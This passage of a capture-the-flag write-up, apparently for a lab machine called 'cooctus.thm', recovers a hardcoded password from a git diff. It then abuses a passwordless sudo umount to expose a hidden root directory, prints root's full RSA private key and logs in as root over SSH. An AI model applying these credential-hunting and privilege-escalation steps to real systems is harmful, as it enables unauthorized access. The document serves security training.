   791789     20 -rw-rw----   1 varg     os_tester    17336 Feb 20  2021 /home/varg/cooctOS_src/games/adventure.c
   791824      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /home/varg/cooctOS_src/boot/grub/grub.cfs
   791825      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /home/varg/cooctOS_src/boot/grub/menu.lst
   791828      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /home/varg/cooctOS_src/boot/grub/grubenv
   791827      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /home/varg/cooctOS_src/boot/grub/gfxblacklist.txt
   791826      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /home/varg/cooctOS_src/boot/grub/default
   656786      4 -rw-rw-r--   1 varg     os_tester      240 Feb 20  2021 /opt/CooctFS/.git/info/exclude
   656840      4 -rwxrwxr-x   1 varg     os_tester      189 Feb 20  2021 /opt/CooctFS/.git/hooks/post-update.sample
   656842      4 -rwxrwxr-x   1 varg     os_tester      544 Feb 20  2021 /opt/CooctFS/.git/hooks/pre-receive.sample
   656869      4 -rwxrwxr-x   1 varg     os_tester      424 Feb 20  2021 /opt/CooctFS/.git/hooks/pre-applypatch.sample
   656870      4 -rwxrwxr-x   1 varg     os_tester      478 Feb 20  2021 /opt/CooctFS/.git/hooks/applypatch-msg.sample
   656871      4 -rwxrwxr-x   1 varg     os_tester     1348 Feb 20  2021 /opt/CooctFS/.git/hooks/pre-push.sample
   657105      4 -rwxrwxr-x   1 varg     os_tester     3327 Feb 20  2021 /opt/CooctFS/.git/hooks/fsmonitor-watchman.sample
   657106      8 -rwxrwxr-x   1 varg     os_tester     4898 Feb 20  2021 /opt/CooctFS/.git/hooks/pre-rebase.sample
   657201      4 -rwxrwxr-x   1 varg     os_tester     1492 Feb 20  2021 /opt/CooctFS/.git/hooks/prepare-commit-msg.sample
   657202      4 -rwxrwxr-x   1 varg     os_tester     3610 Feb 20  2021 /opt/CooctFS/.git/hooks/update.sample
   657209      4 -rwxrwxr-x   1 varg     os_tester     1642 Feb 20  2021 /opt/CooctFS/.git/hooks/pre-commit.sample
   657210      4 -rwxrwxr-x   1 varg     os_tester      896 Feb 20  2021 /opt/CooctFS/.git/hooks/commit-msg.sample
   791856      4 -r--r--r--   1 varg     os_tester      100 Feb 20  2021 /opt/CooctFS/.git/objects/fc/d35c7ada03205aa77a743d85d660860cf14c48
   791843      8 -r--r--r--   1 varg     os_tester     4304 Feb 20  2021 /opt/CooctFS/.git/objects/08/2d88a3c97355277f55c3383bb869d3d64bcee9
   791837      4 -r--r--r--   1 varg     os_tester      707 Feb 20  2021 /opt/CooctFS/.git/objects/4c/cfcc1d5742af9ad901dac3f738154c3683de77
   791848      4 -r--r--r--   1 varg     os_tester       55 Feb 20  2021 /opt/CooctFS/.git/objects/67/4f1b1ae6d994272a46ecfd208d201d1426c83c
   791858      4 -r--r--r--   1 varg     os_tester      136 Feb 20  2021 /opt/CooctFS/.git/objects/69/19df5c171460507f69769bc20e19bd0838b74d
   791862      4 -r--r--r--   1 varg     os_tester      178 Feb 20  2021 /opt/CooctFS/.git/objects/8b/8daa41120535c569d0b99c6859a1699227d086
   791839      4 -r--r--r--   1 varg     os_tester       15 Feb 20  2021 /opt/CooctFS/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
   791845      4 -r--r--r--   1 varg     os_tester      126 Feb 20  2021 /opt/CooctFS/.git/objects/00/e63886a955cede2f44534e20f884d2fda173f1
   791852      4 -r--r--r--   1 varg     os_tester       46 Feb 20  2021 /opt/CooctFS/.git/objects/72/408be6bb0c1a6976aa26162260307c52eee572
   791841      8 -r--r--r--   1 varg     os_tester     6365 Feb 20  2021 /opt/CooctFS/.git/objects/4a/01a201d5d31d5ddd9a96f54886cbf047339351
   791850      4 -r--r--r--   1 varg     os_tester       98 Feb 20  2021 /opt/CooctFS/.git/objects/26/cf7e351554b1de3fceafdfafe4105263de32d5
   791860      4 -r--r--r--   1 varg     os_tester       75 Feb 20  2021 /opt/CooctFS/.git/objects/f7/7a3cace47a909cd4473040cebfbc88820aa6bb
   791854      4 -r--r--r--   1 varg     os_tester      114 Feb 20  2021 /opt/CooctFS/.git/objects/c4/ff351c0d111d90f97d93b8171747c0144a4939
   657336      4 -rw-rw-r--   1 varg     os_tester       37 Feb 20  2021 /opt/CooctFS/.git/COMMIT_EDITMSG
   657274      4 -rw-rw-r--   1 varg     os_tester       23 Feb 20  2021 /opt/CooctFS/.git/HEAD
   791863      4 -rw-rw-r--   1 varg     os_tester       41 Feb 20  2021 /opt/CooctFS/.git/refs/heads/master
   657240      4 -rw-rw-r--   1 varg     os_tester       73 Feb 20  2021 /opt/CooctFS/.git/description
   657602      4 -rw-rw-r--   1 varg     os_tester      340 Feb 20  2021 /opt/CooctFS/.git/logs/HEAD
   657684      4 -rw-rw-r--   1 varg     os_tester      340 Feb 20  2021 /opt/CooctFS/.git/logs/refs/heads/master
   657387      4 -rw-rw-r--   1 varg     os_tester      825 Feb 20  2021 /opt/CooctFS/.git/index
   657386      4 -rw-rw-r--   1 varg     os_tester       92 Feb 20  2021 /opt/CooctFS/.git/config
   791790     24 -rwxrwx--x   1 varg     os_tester    21088 Feb 20  2021 /opt/CooctFS/games/adventure
   791793      4 -rw-rw----   1 varg     os_tester      129 Feb 20  2021 /opt/CooctFS/games/note
   791789     20 -rw-rw----   1 varg     os_tester    17336 Feb 20  2021 /opt/CooctFS/games/adventure.c
   791824      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /opt/CooctFS/boot/grub/grub.cfs
   791825      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /opt/CooctFS/boot/grub/menu.lst
   791828      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /opt/CooctFS/boot/grub/grubenv
   791827      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /opt/CooctFS/boot/grub/gfxblacklist.txt
   791826      0 -rw-rw----   1 varg     os_tester        0 Feb 20  2021 /opt/CooctFS/boot/grub/default
   
tux@cchq:~$ find / -type d -maxdepth 3 -group os_tester  -ls 2>/dev/null

   656731      4 drwxrwx---  11 varg     os_tester     4096 Feb 20  2021 /home/varg/cooctOS_src
   656731      4 drwxrwx---  11 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS
   656743      4 drwxrwx---   3 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/lib
   791668      4 drwxrwx---   2 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/bin
   655425      4 drwxrwx---  16 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/run
   656752      4 drwxrwx---  11 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/var
   655467      4 drwxrwxr-x   8 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/.git
   791787      4 drwxrwx---   2 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/games
   656017      4 drwxrwx---   2 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/etc
   656756      4 drwxrwx---   2 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/tmp
   656773      4 drwxrwx---   4 varg     os_tester     4096 Feb 20  2021 /opt/CooctFS/boot
   
tux@cchq:~$ ls -lsa /opt/CooctFS
total 44
4 drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 .
4 drwxr-xr-x  3 root root      4096 Feb 20  2021 ..
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 bin
4 drwxrwx---  4 varg os_tester 4096 Feb 20  2021 boot
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 etc
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 games
4 drwxrwxr-x  8 varg os_tester 4096 Feb 20  2021 .git
4 drwxrwx---  3 varg os_tester 4096 Feb 20  2021 lib
4 drwxrwx--- 16 varg os_tester 4096 Feb 20  2021 run
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 tmp
4 drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 var

tux@cchq:~$ cd /opt/CooctFS
tux@cchq:/opt/CooctFS$ git log
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

commit 6919df5c171460507f69769bc20e19bd0838b74d
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:46:28 2021 +0000

    Created git repo for CooctOS
    
tux@cchq:/opt/CooctFS$ git diff 8b8daa41120535c569d0b99c6859a1699227d086 6919df5c171460507f69769bc20e19bd0838b74d

+#!/usr/bin/python3
+
+import time
+import os;
+import pty;
+
+#print(chr(27)+ "[2J")
+logo = """\033[1;30;49m

[REDACTED] - MORE

+print(logo)
+print("                       LOADING")
+print("[", end='')
+
+for i in range(0,60):
+    #print(chr(27)+ "[2J")
+    #print(logo)
+    #print("                       LOADING")
+    print("[", end='')
+    print("=" * i, end='')
+    print("]")

[REDACTED] - MORE

+
+print("CooctOS 13.3.7 LTS cookie tty1")
+uname = input("\ncookie login: ")
+pw = input("Password: ")
+
+for i in range(0,2):
+    if pw != "slowroastpork":
+        pw = input("Password: ")
+    else:
+        if uname == "varg":
+            os.setuid(1002)
+            os.setgid(1002)
+            pty.spawn("/bin/rbash")
+            break
+        else:
+            print("Login Failed")
+            break

[REDACTED] - MORE

tux@cchq:/opt/CooctFS$
```

`ssh varg@cooctus.thm -p 22`

```bash
varg@cooctus.thm's password: slowroastpork

Last login: Sat Feb 20 22:05:34 2021 from 172.16.228.162
varg@cchq:~$ whoami
varg
varg@cchq:~$ id
uid=1002(varg) gid=1002(varg) groups=1002(varg),1005(os_tester)
varg@cchq:~$ pwd
/home/varg
varg@cchq:~$ 
```

> **Privilege Escalation with Mount Process**
> 

```bash
varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
    
varg@cchq:~$ ls -lsa /opt/CooctFS/
total 44
4 drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 .
4 drwxr-xr-x  3 root root      4096 Feb 20  2021 ..
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 bin
4 drwxrwx---  4 varg os_tester 4096 Feb 20  2021 boot
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 etc
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 games
4 drwxrwxr-x  8 varg os_tester 4096 Feb 20  2021 .git
4 drwxrwx---  3 varg os_tester 4096 Feb 20  2021 lib
4 drwxrwx--- 16 varg os_tester 4096 Feb 20  2021 run
4 drwxrwx---  2 varg os_tester 4096 Feb 20  2021 tmp
4 drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 var

varg@cchq:~$ find /opt/CooctFS/ -type f -perm -u=s -user varg -ls 2>/dev/null
varg@cchq:~$ find /opt/CooctFS/ -type f -perm -u=s -user root -ls 2>/dev/null

varg@cchq:~$ sudo /bin/umount -l /opt/CooctFS
varg@cchq:~$ df -h
Filesystem                         Size  Used Avail Use% Mounted on
udev                               461M     0  461M   0% /dev
tmpfs                               99M  672K   98M   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv   19G  6.6G   12G  38% /
tmpfs                              492M     0  492M   0% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              492M     0  492M   0% /sys/fs/cgroup
/dev/xvda2                         976M  146M  764M  16% /boot
tmpfs                               99M     0   99M   0% /run/user/1003
tmpfs                               99M     0   99M   0% /run/user/1001
tmpfs                               99M     0   99M   0% /run/user/1000
tmpfs                               99M     0   99M   0% /run/user/1002

varg@cchq:~$ ls -al /opt
total 12
drwxr-xr-x  3 root root 4096 Feb 20  2021 .
drwxr-xr-x 24 root root 4096 Feb 20  2021 ..
drwxr-xr-x  3 root root 4096 Feb 20  2021 CooctFS
varg@cchq:~$ ls -lsa /opt/CooctFS
total 12
4 drwxr-xr-x 3 root root 4096 Feb 20  2021 .
4 drwxr-xr-x 3 root root 4096 Feb 20  2021 ..
4 drwxr-xr-x 5 root root 4096 Feb 20  2021 root
varg@cchq:~$ ls -lsa /opt/CooctFS/root
total 28
4 drwxr-xr-x 5 root root 4096 Feb 20  2021 .
4 drwxr-xr-x 3 root root 4096 Feb 20  2021 ..
0 lrwxrwxrwx 1 root root    9 Feb 20  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 root root 3106 Feb 20  2021 .bashrc
4 drwx------ 3 root root 4096 Feb 20  2021 .cache
4 drwxr-xr-x 3 root root 4096 Feb 20  2021 .local
4 -rw-r--r-- 1 root root   43 Feb 20  2021 root.txt
4 drwxr-xr-x 2 root root 4096 Feb 20  2021 .ssh
varg@cchq:~$ cat /opt/CooctFS/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
5vqc2vl5vd3ZPcOHp3w1pIF3MH6kgY3JicvfHVc3phWukXuw2UunYtBVNSaj6hKn
DwIWH3xCnWBqG6BR4dI3woQwOWQ6e5wcKlYz/mqmQIUKqvY5H3fA8HVghu7ARSre
9lVwzN4eat2QPnK0BbG3gjhLjpN0ztp0LrQI1SCwBJXSwr5H8u2eU25XVVmmEvdY
+n9+v+Mon2Ne7vCobNjv4MMzXal50BlwlhNtwgwt1aWgNOyPhQFE6ceg4lGEWOUq
Jz2sMB4GzqER8/G9ESan7UOtrarhvHtC+l5g2QIDAQABAoIBAC9qKRa7LqVLXbGn
wVa9ra/AVgxihvLLZsIwAF764Tze8XDpD8ysVnBlEYGHZeeePfkeua4jrY+U/E1k
xT6Cfsf9/Vf6Haeu7Yurxd7jQu7BAgVba+ZQi6vuofPCgVeSFQWIMgOH4+MxJgpP
Qg76sZ/SATajqraclVYa5X8FmO5bF1MEqFLtszsGR0QDgY21o0DSaeou5F1WRPJ6
Q8EogxMj2G393BrlZfdoL4j/3iZoEwFwEtMc9SX435bnxcEnv+x4lDmC1MRY1TgZ
fx558Lswfnz5FIl1HCHIVvOKnTFq16O7fAoCldVDCaRr+SDbOk71UDxcQN2SgMDH
KDQmPmUCgYEA6RtG4wwpJYRMgTij+Pkutg4/CaNXTn0/NmSET//x57hxiFThNBK9
7DtlR7FTvoN1mp3AvLSk0sVmalewnilDyFjrVc1QUYZkBAguSmVgABO80usrPNfx
eanBrzDSHG9jUk+Nhmv+dctgnvwurLBVB86PzngxA6wxDQE64bS0Qz8CgYEA2wXg
Ltr5gWjHuwdctaFSPNqms6TutxqV2F8DNsZW7zgTI+j6CUIbhQ8FcH3NhSX6K2gE
vYIbiMDM3U3WVIOqp+piWAqPHwps4if1SHbXOgFtUBSpYwJj3jFE/qohMYIpJXU4
sE8TgrK8iUylI741fYrB2CG/OjvH5vsZ2e5UjecCgYBGjATGDhYdzo5AxV2Kqg8i
9ejKB+8SSAFrerw4YeNaF430jouhcNKdvdQHAHmxvKNI6dk8wwbm6ur14BgJpb9n
0NFYJEzcf2mhdsBbr5aAL3kD9Dwfq9Le2StO092i0WsjrAPO3Lwj9isFspiFltAF
DtSizek3jVNC9k5VpJSxjQKBgQDNS0uf/6aA8yrLlxICOWzxF23L0xviSywLPLux
euV/osrmDPlY9jr/VF4f2/tpA3jjeMOAslSGsVkVUmFEpImwjNSTe4o9aTM4JIYX
3zTL7Qx+VG+VG2dqnDn0jplAY6WXs7FoKSa7ijeIZmwf/aj7vLUHllI9Dk3IprLL
gEaHHwKBgQDQQ3tLEWwGbULkIXiKopgN/6ySp23TVFHKK8D8ZXzRgxiroBkG129t
FXhWaDVCDTHczV1Ap3jKn1UKFHdhsayK34EAvRiTc+onpkrOMEkK6ky9nSGWSWbr
knJ1V6wrLgd2qPq2r5g0a/Qk2fL0toxFbnsQRsueVfPwCQWTjSo/Wg==
-----END RSA PRIVATE KEY-----

varg@cchq:~$ 

```

`nano rootid`

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
5vqc2vl5vd3ZPcOHp3w1pIF3MH6kgY3JicvfHVc3phWukXuw2UunYtBVNSaj6hKn
DwIWH3xCnWBqG6BR4dI3woQwOWQ6e5wcKlYz/mqmQIUKqvY5H3fA8HVghu7ARSre
9lVwzN4eat2QPnK0BbG3gjhLjpN0ztp0LrQI1SCwBJXSwr5H8u2eU25XVVmmEvdY
+n9+v+Mon2Ne7vCobNjv4MMzXal50BlwlhNtwgwt1aWgNOyPhQFE6ceg4lGEWOUq
Jz2sMB4GzqER8/G9ESan7UOtrarhvHtC+l5g2QIDAQABAoIBAC9qKRa7LqVLXbGn
wVa9ra/AVgxihvLLZsIwAF764Tze8XDpD8ysVnBlEYGHZeeePfkeua4jrY+U/E1k
xT6Cfsf9/Vf6Haeu7Yurxd7jQu7BAgVba+ZQi6vuofPCgVeSFQWIMgOH4+MxJgpP
Qg76sZ/SATajqraclVYa5X8FmO5bF1MEqFLtszsGR0QDgY21o0DSaeou5F1WRPJ6
Q8EogxMj2G393BrlZfdoL4j/3iZoEwFwEtMc9SX435bnxcEnv+x4lDmC1MRY1TgZ
fx558Lswfnz5FIl1HCHIVvOKnTFq16O7fAoCldVDCaRr+SDbOk71UDxcQN2SgMDH
KDQmPmUCgYEA6RtG4wwpJYRMgTij+Pkutg4/CaNXTn0/NmSET//x57hxiFThNBK9
7DtlR7FTvoN1mp3AvLSk0sVmalewnilDyFjrVc1QUYZkBAguSmVgABO80usrPNfx
eanBrzDSHG9jUk+Nhmv+dctgnvwurLBVB86PzngxA6wxDQE64bS0Qz8CgYEA2wXg
Ltr5gWjHuwdctaFSPNqms6TutxqV2F8DNsZW7zgTI+j6CUIbhQ8FcH3NhSX6K2gE
vYIbiMDM3U3WVIOqp+piWAqPHwps4if1SHbXOgFtUBSpYwJj3jFE/qohMYIpJXU4
sE8TgrK8iUylI741fYrB2CG/OjvH5vsZ2e5UjecCgYBGjATGDhYdzo5AxV2Kqg8i
9ejKB+8SSAFrerw4YeNaF430jouhcNKdvdQHAHmxvKNI6dk8wwbm6ur14BgJpb9n
0NFYJEzcf2mhdsBbr5aAL3kD9Dwfq9Le2StO092i0WsjrAPO3Lwj9isFspiFltAF
DtSizek3jVNC9k5VpJSxjQKBgQDNS0uf/6aA8yrLlxICOWzxF23L0xviSywLPLux
euV/osrmDPlY9jr/VF4f2/tpA3jjeMOAslSGsVkVUmFEpImwjNSTe4o9aTM4JIYX
3zTL7Qx+VG+VG2dqnDn0jplAY6WXs7FoKSa7ijeIZmwf/aj7vLUHllI9Dk3IprLL
gEaHHwKBgQDQQ3tLEWwGbULkIXiKopgN/6ySp23TVFHKK8D8ZXzRgxiroBkG129t
FXhWaDVCDTHczV1Ap3jKn1UKFHdhsayK34EAvRiTc+onpkrOMEkK6ky9nSGWSWbr
knJ1V6wrLgd2qPq2r5g0a/Qk2fL0toxFbnsQRsueVfPwCQWTjSo/Wg==
-----END RSA PRIVATE KEY-----
```

`chmod 600 rootid`

`ssh -i rootid root@cooctus.thm -p 22`

```bash
root@cchq:~# whoami
root
root@cchq:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cchq:~# 
```